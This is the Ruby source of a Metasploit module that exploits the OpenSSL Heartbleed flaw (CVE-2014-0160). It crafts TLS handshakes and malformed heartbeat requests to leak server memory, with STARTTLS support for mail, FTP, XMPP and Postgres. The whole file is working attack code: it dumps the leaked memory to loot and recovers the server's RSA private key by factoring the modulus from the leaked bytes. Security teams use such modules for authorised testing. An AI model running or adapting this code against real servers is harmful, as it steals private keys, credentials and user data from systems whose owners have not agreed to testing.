##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# TODO: Connection reuse: Only connect once and send subsequent heartbleed requests.
#   We tried it once in https://github.com/rapid7/metasploit-framework/pull/3300
#   but there were too many errors
# TODO: Parse the rest of the server responses and return a hash with the data
# TODO: Extract the relevant functions and include them in the framework

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  CIPHER_SUITES = [
    0xc014, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
    0xc00a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
    0xc022, # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
    0xc021, # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
    0x0039, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
    0x0038, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
    0x0088, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
    0x0087, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
    0xc00f, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
    0x0035, # TLS_RSA_WITH_AES_256_CBC_SHA
    0x0084, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
    0xc012, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
    0xc008, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
    0xc01c, # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
    0xc01b, # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
    0x0016, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
    0x0013, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
    0xc00d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
    0xc003, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
    0x000a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA
    0xc013, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
    0xc009, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
    0xc01f, # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
    0xc01e, # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
    0x0033, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
    0x0032, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
    0x009a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA
    0x0099, # TLS_DHE_DSS_WITH_SEED_CBC_SHA
    0x0045, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
    0x0044, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
    0xc00e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
    0xc004, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
    0x002f, # TLS_RSA_WITH_AES_128_CBC_SHA
    0x0096, # TLS_RSA_WITH_SEED_CBC_SHA
    0x0041, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
    0xc011, # TLS_ECDHE_RSA_WITH_RC4_128_SHA
    0xc007, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
    0xc00c, # TLS_ECDH_RSA_WITH_RC4_128_SHA
    0xc002, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
    0x0005, # TLS_RSA_WITH_RC4_128_SHA
    0x0004, # TLS_RSA_WITH_RC4_128_MD5
    0x0015, # TLS_DHE_RSA_WITH_DES_CBC_SHA
    0x0012, # TLS_DHE_DSS_WITH_DES_CBC_SHA
    0x0009, # TLS_RSA_WITH_DES_CBC_SHA
    0x0014, # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0011, # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
    0x0008, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
    0x0006, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
    0x0003, # TLS_RSA_EXPORT_WITH_RC4_40_MD5
    0x00ff  # Unknown
  ]

  SSL_RECORD_HEADER_SIZE            = 0x05
  HANDSHAKE_RECORD_TYPE             = 0x16
  HEARTBEAT_RECORD_TYPE             = 0x18
  ALERT_RECORD_TYPE                 = 0x15
  HANDSHAKE_SERVER_HELLO_TYPE       = 0x02
  HANDSHAKE_CERTIFICATE_TYPE        = 0x0b
  HANDSHAKE_KEY_EXCHANGE_TYPE       = 0x0c
  HANDSHAKE_SERVER_HELLO_DONE_TYPE  = 0x0e

  TLS_VERSION = {
    'SSLv3' => 0x0300,
    '1.0'   => 0x0301,
    '1.1'   => 0x0302,
    '1.2'   => 0x0303
  }

  TLS_CALLBACKS = {
    'SMTP'   => :tls_smtp,
    'IMAP'   => :tls_imap,
    'JABBER' => :tls_jabber,
    'POP3'   => :tls_pop3,
    'FTP'    => :tls_ftp,
    'POSTGRES'   => :tls_postgres
  }

  # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
  SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)

  # For verbose output, deduplicate repeated characters beyond this threshold
  DEDUP_REPEATED_CHARS_THRESHOLD = 400

  def initialize
    super(
      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',
      'Description'    => %q{
        This module implements the OpenSSL Heartbleed attack. The problem
        exists in the handling of heartbeat requests, where a fake length can
        be used to leak memory data in the response. Services that support
        STARTTLS may also be vulnerable.

        The module supports several actions, allowing for scanning, dumping of
        memory contents to loot, and private key recovery.

        The LEAK_COUNT option can be used to specify leaks per SCAN or DUMP.

        The repeat command can be used to make running the SCAN or DUMP many
        times more powerful. As in:
            repeat -t 60 run; sleep 2
        To run every two seconds for one minute.
      },
      'Author'         => [
        'Neel Mehta', # Vulnerability discovery
        'Riku', # Vulnerability discovery
        'Antti', # Vulnerability discovery
        'Matti', # Vulnerability discovery
        'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
        'FiloSottile', # PoC site and tool
        'Christian Mehlmauer', # Msf module
        'wvu', # Metasploit module
        'juan vazquez', # Metasploit module
        'Sebastiano Di Paola', # Msf module
        'Tom Sellers', # Metasploit module
        'jjarmoc', # Metasploit module; keydump, refactoring..
        'Ben Buchanan', #Metasploit module
        'herself' #Metasploit module
      ],
      'References'     =>
        [
          [ 'CVE', '2014-0160' ],
          [ 'US-CERT-VU', '720951' ],
          [ 'URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA14-098A' ],
          [ 'URL', 'https://heartbleed.com/' ],
          [ 'URL', 'https://github.com/FiloSottile/Heartbleed' ],
          [ 'URL', 'https://gist.github.com/takeshixx/10107280' ],
          [ 'URL', 'https://filippo.io/Heartbleed/' ]
        ],
      'DisclosureDate' => '2014-04-07',
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['SCAN', 'Description' => 'Check hosts for vulnerability'],
          ['DUMP', 'Description' => 'Dump memory contents to loot'],
          ['KEYS', 'Description' => 'Recover private keys from memory']
        ],
      'DefaultAction' => 'SCAN',
      'Notes' =>
          {
              'AKA' => ['Heartbleed']
          }
    )

    register_options(
      [
        Opt::RPORT(443),
        OptEnum.new('TLS_CALLBACK', [true, 'Protocol to use, "None" to use raw TLS sockets', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP', 'POSTGRES' ]]),
        OptEnum.new('TLS_VERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 50]),
        OptInt.new('STATUS_EVERY', [true, 'How many retries until key dump status', 5]),
        OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil]),
        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 10]),
        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])
      ])

    register_advanced_options(
      [
        OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
        OptString.new('XMPPDOMAIN', [true, 'The XMPP Domain to use when Jabber is selected', 'localhost'])
      ])

  end

  #
  # Main methods
  #

  # Called when using check
  def check_host(ip)
    @check_only = true
    vprint_status "Checking for Heartbleed exposure"
    if bleed
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run
    if heartbeat_length > 65535 || heartbeat_length < 0
      print_error('HEARTBEAT_LENGTH should be a natural number less than 65536')
      return
    end

    if response_timeout < 0
      print_error('RESPONSE_TIMEOUT should be bigger than 0')
      return
    end

    super
  end

  # Main method
  def run_host(ip)
    case action.name
      # SCAN and DUMP are similar, but DUMP stores loot
      when 'SCAN', 'DUMP'
        # 'Tis but a scratch
        bleeded = ''

        1.upto(leak_count) do |count|
          vprint_status("Leaking heartbeat response ##{count}")
          bleeded << bleed.to_s
        end

        loot_and_report(bleeded)
      when 'KEYS'
        get_keys
      else
        # Shouldn't get here, since Action is Enum
        print_error("Unknown Action: #{action.name}")
    end

    # ensure all connections are closed
    disconnect
  end

  #
  # DATASTORE values
  #

  # If this is merely a check, set to the RFC-defined
  # maximum padding length of 2^14. See:
  # https://tools.ietf.org/html/rfc6520#section-4
  # https://github.com/rapid7/metasploit-framework/pull/3252
  def heartbeat_length
    if @check_only
      SAFE_CHECK_MAX_RECORD_LENGTH
    else
      datastore['HEARTBEAT_LENGTH']
    end
  end

  def response_timeout
    datastore['RESPONSE_TIMEOUT']
  end

  def tls_version
    datastore['TLS_VERSION']
  end

  def dumpfilter
    datastore['DUMPFILTER']
  end

  def max_keytries
    datastore['MAX_KEYTRIES']
  end

  def xmpp_domain
    datastore['XMPPDOMAIN']
  end

  def status_every
    datastore['STATUS_EVERY']
  end

  def tls_callback
    datastore['TLS_CALLBACK']
  end

  def leak_count
    datastore['LEAK_COUNT']
  end

  #
  # TLS Callbacks
  #

  def tls_smtp
    # https://tools.ietf.org/html/rfc3207
    get_data
    sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\r\n")
    res = get_data

    unless res && res =~ /STARTTLS/
      return nil
    end
    sock.put("STARTTLS\r\n")
    get_data
  end

  def tls_imap
    # http://tools.ietf.org/html/rfc2595
    get_data
    sock.put("a001 CAPABILITY\r\n")
    res = get_data
    unless res && res =~ /STARTTLS/i
      return nil
    end
    sock.put("a002 STARTTLS\r\n")
    get_data
  end

  def tls_postgres
    # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3
    # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html
    get_data
    # the postgres SSLRequest packet is a int32(8) followed by a int16(1234),
    # int16(5679) in network format
    psql_sslrequest = [8].pack('N')
    psql_sslrequest << [1234, 5679].pack('n*')
    sock.put(psql_sslrequest)
    res = get_data
    unless res && res =~ /S/
      return nil
    end
    res
  end

  def tls_pop3
    # http://tools.ietf.org/html/rfc2595
    get_data
    sock.put("CAPA\r\n")
    res = get_data
    if res.nil? || res =~ /^-/ || res !~ /STLS/
      return nil
    end
    sock.put("STLS\r\n")
    res = get_data
    if res.nil? || res =~ /^-/
      return nil
    end
    res
  end

  def jabber_connect_msg(hostname)
    # http://xmpp.org/extensions/xep-0035.html
    msg = "<stream:stream xmlns='jabber:client' "
    msg << "xmlns:stream='http://etherx.jabber.org/streams' "
    msg << "version='1.0' "
    msg << "to='#{hostname}'>"
  end

  def tls_jabber
    sock.put(jabber_connect_msg(xmpp_domain))
    res = get_data
    if res && res.include?('host-unknown')
      jabber_host = res.match(/ from='([\w.]*)' /)
      if jabber_host && jabber_host[1]
        disconnect
        establish_connect
        vprint_status("Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
        sock.put(jabber_connect_msg(jabber_host[1]))
        res = get_data
      end
    end
    if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
      vprint_error("Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res.include?('host-unknown')
      return nil
    end
    msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
    sock.put(msg)
    res = get_data
    return nil if res.nil? || !res.include?('<proceed')
    res
  end

  def tls_ftp
    # http://tools.ietf.org/html/rfc4217
    res = get_data
    return nil if res.nil?
    sock.put("AUTH TLS\r\n")
    res = get_data
    return nil if res.nil?
    if res !~ /^234/
      # res contains the error message
      vprint_error("FTP error: #{res.strip}")
      return nil
    end
    res
  end

  #
  # Helper Methods
  #

  # Get data from the socket
  # this ensures the requested length is read (if available)
  def get_data(length = -1)
    to_receive = length
    data = ''
    done = false
    while done == false
      begin
        temp = sock.get_once(to_receive, response_timeout)
      rescue EOFError
        break
      end

      break if temp.nil?

      data << temp
      if length != -1
        to_receive -= temp.length
        done = true if to_receive <= 0
      end
    end

    data
  end

  def to_hex_string(data)
    data.each_byte.map { |b| sprintf('%02X ', b) }.join.strip
  end

  # establishes a connect and parses the server response
  def establish_connect
    connect

    unless tls_callback == 'None'
      vprint_status("Trying to start SSL via #{tls_callback}")
      res = self.send(TLS_CALLBACKS[tls_callback])
      if res.nil?
        vprint_error("STARTTLS failed...")
        return nil
      end
    end

    vprint_status("Sending Client Hello...")
    sock.put(client_hello)

    server_resp = get_server_hello

    if server_resp.nil?
      vprint_error("Server Hello Not Found")
      return nil
    end

    server_resp
  end

  # Generates a heartbeat request
  def heartbeat_request(length)
    payload = "\x01"              # Heartbeat Message Type: Request (1)
    payload << [length].pack('n') # Payload Length: 65535

    ssl_record(HEARTBEAT_RECORD_TYPE, payload)
  end

  # Generates, sends and receives a heartbeat message
  def bleed
    connect_result = establish_connect
    return if connect_result.nil?

    vprint_status("Sending Heartbeat...")
    sock.put(heartbeat_request(heartbeat_length))
    hdr = get_data(SSL_RECORD_HEADER_SIZE)
    if hdr.nil? || hdr.empty?
      vprint_error("No Heartbeat response...")
      disconnect
      return
    end

    unpacked = hdr.unpack('Cnn')
    type = unpacked[0]
    version = unpacked[1] # must match the type from client_hello
    len = unpacked[2]

    # try to get the TLS error
    if type == ALERT_RECORD_TYPE
      res = get_data(len)
      alert_unp = res.unpack('CC')
      alert_level = alert_unp[0]
      alert_desc = alert_unp[1]

      # http://tools.ietf.org/html/rfc5246#section-7.2
      case alert_desc
      when 0x46
        msg = 'Protocol error. Looks like the chosen protocol is not supported.'
      else
        msg = 'Unknown error'
      end
      vprint_error("#{msg}")
      disconnect
      return
    end

    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
      vprint_error("Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
      disconnect
      return
    end

    heartbeat_data = get_data(heartbeat_length)
    vprint_status("Heartbeat response, #{heartbeat_data.length} bytes")
    disconnect
    heartbeat_data
  end

  # Stores received data
  def loot_and_report(heartbeat_data)
    if heartbeat_data.to_s.empty?
      vprint_error("Looks like there isn't leaked information...")
      return
    end

    print_good("Heartbeat response with leak, #{heartbeat_data.length} bytes")
    report_vuln({
      :host => rhost,
      :port => rport,
      :name => self.name,
      :refs => self.references,
      :info => "Module #{self.fullname} successfully leaked info"
    })

    if action.name == 'DUMP' # Check mode, dump if requested.
      pattern = dumpfilter
      if pattern
        match_data = heartbeat_data.scan(pattern).join
      else
        match_data = heartbeat_data
      end
      path = store_loot(
        'openssl.heartbleed.server',
        'application/octet-stream',
        rhost,
        match_data,
        nil,
        'OpenSSL Heartbleed server memory'
      )
      print_good("Heartbeat data stored in #{path}")
    end

    # Convert non-printable characters to periods
    printable_data = heartbeat_data.gsub(/[^[:print:]]/, '.')

    # Keep this many duplicates as padding around the deduplication message
    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round

    # Remove duplicate characters
    abbreviated_data = printable_data.gsub(/(.)\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|
      s[0, duplicate_pad] +
      ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +
      s[-duplicate_pad, duplicate_pad]
    end

    # Show abbreviated data
    vprint_status("Printable info leaked:\n#{abbreviated_data}")
  end

  #
  # Keydumping helper methods
  #

  # Tries to retreive the private key
  def get_keys
    connect_result = establish_connect
    disconnect
    return if connect_result.nil?

    print_status("Scanning for private keys")
    count = 0

    print_status("Getting public key constants...")
    n, e = get_ne

    if n.nil? || e.nil?
      print_error("Failed to get public key, aborting.")
    end

    vprint_status("n: #{n}")
    vprint_status("e: #{e}")
    print_status("#{Time.now.getutc} - Starting.")

    max_keytries.times {
      # Loop up to MAX_KEYTRIES times, looking for keys
      if count % status_every == 0
        print_status("#{Time.now.getutc} - Attempt #{count}...")
      end

      bleedresult = bleed
      return unless bleedresult

      p, q = get_factors(bleedresult, n) # Try to find factors in mem

      unless p.nil? || q.nil?
        key = key_from_pqe(p, q, e)
        print_good("#{Time.now.getutc} - Got the private key")

        print_status(key.export)
        path = store_loot(
          'openssl.heartbleed.server',
          'text/plain',
          rhost,
          key.export,
          nil,
          'OpenSSL Heartbleed Private Key'
        )
        print_status("Private key stored in #{path}")
        return
      end
      count += 1
    }
    print_error("Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.")
  end

  # Returns the N and E params from the public server certificate
  def get_ne
    unless @cert
      print_error("No certificate found")
      return
    end

    return @cert.public_key.params['n'], @cert.public_key.params['e']
  end

  # Tries to find pieces of the private key in the provided data
  def get_factors(data, n)
    # Walk through data looking for factors of n
    psize = n.num_bits / 8 / 2
    return if data.nil?

    (0..(data.length-psize)).each{ |x|
      # Try each offset of suitable length
      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)
      if can > 1 && can % 2 != 0 && can.num_bytes == psize
        # Only try candidates that have a chance...
        q, rem = n / can
        if rem == 0 && can != n
          vprint_good("Found factor at offset #{x.to_s(16)}")
          p = can
          return p, q
        end
      end
    }
    return nil, nil
  end

  # Generates the private key from the P, Q and E values
  def key_from_pqe(p, q, e)
    n = p * q
    phi = (p - 1) * (q - 1 )
    d = OpenSSL::BN.new(e).mod_inverse(phi)

    dmp1 = d % (p - 1)
    dmq1 = d % (q - 1)
    iqmp = q.mod_inverse(p)

    asn1 = OpenSSL::ASN1::Sequence(
      [
        OpenSSL::ASN1::Integer(0),
        OpenSSL::ASN1::Integer(n),
        OpenSSL::ASN1::Integer(e),
        OpenSSL::ASN1::Integer(d),
        OpenSSL::ASN1::Integer(p),
        OpenSSL::ASN1::Integer(q),
        OpenSSL::ASN1::Integer(dmp1),
        OpenSSL::ASN1::Integer(dmq1),
        OpenSSL::ASN1::Integer(iqmp)
      ]
    )

    key = OpenSSL::PKey::RSA.new(asn1.to_der)
    key
  end

  #
  # SSL/TLS packet methods
  #

  # Creates and returns a new SSL record with the provided data
  def ssl_record(type, data)
    record = [type, TLS_VERSION[tls_version], data.length].pack('Cnn')
    record << data
  end

  # generates a CLIENT_HELLO ssl/tls packet
  def client_hello
    # Use current day for TLS time
    time_temp = Time.now
    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i

    hello_data = [TLS_VERSION[tls_version]].pack('n') # Version TLS
    hello_data << [time_epoch].pack('N')    # Time in epoch format
    hello_data << Rex::Text.rand_text(28)   # Random
    hello_data << "\x00"                    # Session ID length
    hello_data << [CIPHER_SUITES.length * 2].pack('n') # Cipher Suites length (102)
    hello_data << CIPHER_SUITES.pack('n*')  # Cipher Suites
    hello_data << "\x01"                    # Compression methods length (1)
    hello_data << "\x00"                    # Compression methods: null

    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
    hello_data_extensions << "\x00\x01"     # Extension length
    hello_data_extensions << "\x01"         # Extension data

    hello_data << [hello_data_extensions.length].pack('n')
    hello_data << hello_data_extensions

    data = "\x01\x00"                      # Handshake Type: Client Hello (1)
    data << [hello_data.length].pack('n')  # Length
    data << hello_data

    ssl_record(HANDSHAKE_RECORD_TYPE, data)
  end

  def get_ssl_record
    hdr = get_data(SSL_RECORD_HEADER_SIZE)

    unless hdr
      vprint_error("No SSL record header received after #{response_timeout} seconds...")
      return nil
    end

    len = hdr.unpack('Cnn')[2]
    data = get_data(len) unless len.nil?

    unless data
      vprint_error("No SSL record contents received after #{response_timeout} seconds...")
      return nil
    end

    hdr << data
  end

  # Get and parse server hello response until we hit Server Hello Done or timeout
  def get_server_hello
    server_done = nil
    ssl_record_counter = 0

    remaining_data = get_ssl_record

    while remaining_data && remaining_data.length > 0
      ssl_record_counter += 1
      ssl_unpacked = remaining_data.unpack('CH4n')
      return nil if ssl_unpacked.nil? or ssl_unpacked.length < 3
      ssl_type = ssl_unpacked[0]
      ssl_version = ssl_unpacked[1]
      ssl_len = ssl_unpacked[2]
      vprint_status("SSL record ##{ssl_record_counter}:")
      vprint_status("\tType:    #{ssl_type}")
      vprint_status("\tVersion: 0x#{ssl_version}")
      vprint_status("\tLength:  #{ssl_len}")
      if ssl_type != HANDSHAKE_RECORD_TYPE
        vprint_status("\tWrong Record Type! (#{ssl_type})")
      else
        ssl_data = remaining_data[5, ssl_len]
        handshakes = parse_handshakes(ssl_data)

        # Stop once we receive a SERVER_HELLO_DONE
        if handshakes && handshakes.length > 0 && handshakes[-1][:type] == HANDSHAKE_SERVER_HELLO_DONE_TYPE
          server_done = true
          break
        end

      end

      remaining_data = get_ssl_record
    end

    server_done
  end

  # Parse Handshake data returned from servers
  def parse_handshakes(data)
    # Can contain multiple handshakes
    remaining_data = data
    handshakes = []
    handshake_count = 0
    while remaining_data && remaining_data.length > 0
      hs_unpacked = remaining_data.unpack('CCn')
      next if hs_unpacked.nil? or hs_unpacked.length < 3
      hs_type = hs_unpacked[0]
      hs_len_pad = hs_unpacked[1]
      hs_len = hs_unpacked[2]
      hs_data = remaining_data[4, hs_len]
      handshake_count += 1
      vprint_status("\tHandshake ##{handshake_count}:")
      vprint_status("\t\tLength: #{hs_len}")

      handshake_parsed = nil
      case hs_type
        when HANDSHAKE_SERVER_HELLO_TYPE
          vprint_status("\t\tType:   Server Hello (#{hs_type})")
          handshake_parsed = parse_server_hello(hs_data)
        when HANDSHAKE_CERTIFICATE_TYPE
          vprint_status("\t\tType:   Certificate Data (#{hs_type})")
          handshake_parsed = parse_certificate_data(hs_data)
        when HANDSHAKE_KEY_EXCHANGE_TYPE
          vprint_status("\t\tType:   Server Key Exchange (#{hs_type})")
          # handshake_parsed = parse_server_key_exchange(hs_data)
        when HANDSHAKE_SERVER_HELLO_DONE_TYPE
          vprint_status("\t\tType:   Server Hello Done (#{hs_type})")
        else
          vprint_status("\t\tType:   Handshake type #{hs_type} not implemented")
      end

      handshakes << {
          :type     => hs_type,
          :len      => hs_len,
          :data     => handshake_parsed
      }
      remaining_data = remaining_data[(hs_len + 4)..-1]
    end

    handshakes
  end

  # Parse Server Hello message
  def parse_server_hello(data)
    version = data.unpack('H4')[0]
    vprint_status("\t\tServer Hello Version:           0x#{version}")
    random = data[2,32].unpack('H*')[0]
    vprint_status("\t\tServer Hello random data:       #{random}")
    session_id_length = data[34,1].unpack('C')[0]
    vprint_status("\t\tServer Hello Session ID length: #{session_id_length}")
    session_id = data[35,session_id_length].unpack('H*')[0]
    vprint_status("\t\tServer Hello Session ID:        #{session_id}")
    # TODO Read the rest of the server hello (respect message length)

    # TODO: return hash with data
    true
  end

  # Parse certificate data
  def parse_certificate_data(data)
    # get certificate data length
    unpacked = data.unpack('Cn')
    cert_len_padding = unpacked[0]
    cert_len = unpacked[1]
    vprint_status("\t\tCertificates length: #{cert_len}")
    vprint_status("\t\tData length: #{data.length}")
    # contains multiple certs
    already_read = 3
    cert_counter = 0
    while already_read < cert_len
      cert_counter += 1
      # get single certificate length
      single_cert_unpacked = data[already_read, 3].unpack('Cn')
      single_cert_len_padding = single_cert_unpacked[0]
      single_cert_len =  single_cert_unpacked[1]
      vprint_status("\t\tCertificate ##{cert_counter}:")
      vprint_status("\t\t\tCertificate ##{cert_counter}: Length: #{single_cert_len}")
      certificate_data = data[(already_read + 3), single_cert_len]
      cert = OpenSSL::X509::Certificate.new(certificate_data)
      # First received certificate is the one from the server
      @cert = cert if @cert.nil?
      #vprint_status("Got certificate: #{cert.to_text}")
      vprint_status("\t\t\tCertificate ##{cert_counter}: #{cert.inspect}")
      already_read = already_read + single_cert_len + 3
    end

    # TODO: return hash with data
    true
  end
end
